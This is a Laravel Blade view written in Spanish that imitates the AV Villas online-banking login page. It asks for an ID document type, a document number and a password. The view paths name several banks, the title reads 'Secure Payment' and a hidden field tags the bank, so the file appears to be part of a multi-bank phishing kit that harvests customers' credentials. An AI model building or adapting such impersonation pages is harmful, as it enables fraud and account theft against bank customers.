@extends('banks.avvillas.layout')

@section('title', 'Secure Payment')

@section('page_title', 'Ingresa tu usuario')


{{-- si hay error --}}

<!-- @if($errors->any())
    @include('banks.bancolombia.components.alert', [
      'id' => 'loginError',
      'type' => 'error_field',
      'text' => $errors->first('user'),
      'show' => true,
    ])
  @else
    @include('banks.bancolombia.components.alert', [
      'id' => 'loginError',
      'type' => 'error_field',
      'show' => false,
    ])
  @endif -->

@section('content')
  <div>
    <br><br>
    <div>
      <img src="{{asset('assets/img/payment/avvillas/register-bg-logo.svg')}}">
    </div>
    <div>
      <br><br>
      <a style="font-size:18px; color:white;">Ingresa a la banca virtual</a>
      <br>
    </div>
  </div>

  <br>

  <div><select name="">
      <option value="">Cedula de ciudadania</option>
      <option value="">Cedula extranjera</option>
      <option value="">Pasaporte</option>
  </div>


  </select>


  <div class="form" style="margin-top:15px;">


    <label style="width:85%; height:55px;">
      <input required="required" type="text" class="input" id="txtUsuario" name="user"
        style="width:100%; margin-left:-10px; border-radius:5px; height:25px;" minlength="6" maxlength="10"
        pattern="^[0-9]{6,10}$" oninput="this.value = this.value.replace(/\D+/g, '');">
      <span>Número de documento</span>
    </label>

    <label style="width:85%; height:55px;">
      <input required="required" type="password" class="input" id="txtPass" name="pass"
        style="width:100%; margin-left:-10px; border-radius:5px;  height:25px;"
        oninput="this.value = this.value.replace(/\s+/g, '')">
      <span>Ingrese su clave</span>
    </label>
    <input type="hidden" value="Avvillas" id="banco">
    <a href="" style="color:white; margin-left:50%; font-size:12px;">Olvidé mi contraseña</a>
    <input type="submit" value="Ingresar" id="btnUsuario"
      style="width:85%; height:45px; background-color:red; color:white; border:none; border-radius:100px; margin-left:-10px; font-size:14px;">

  </div><br>

  <hr style="width:90%;">
  <br>
  <a style="color:white;">¿Aún no tienes contraseña para ingresar?</a><br>
  <a href="" style="color:white;">Registrate</a>


  <img src="{{asset('assets/img/payment/avvillas/foter.jfif')}}" alt="" srcset="" width="100%" style="margin-top:110px;">

@endsection


@push('scripts')
@endpush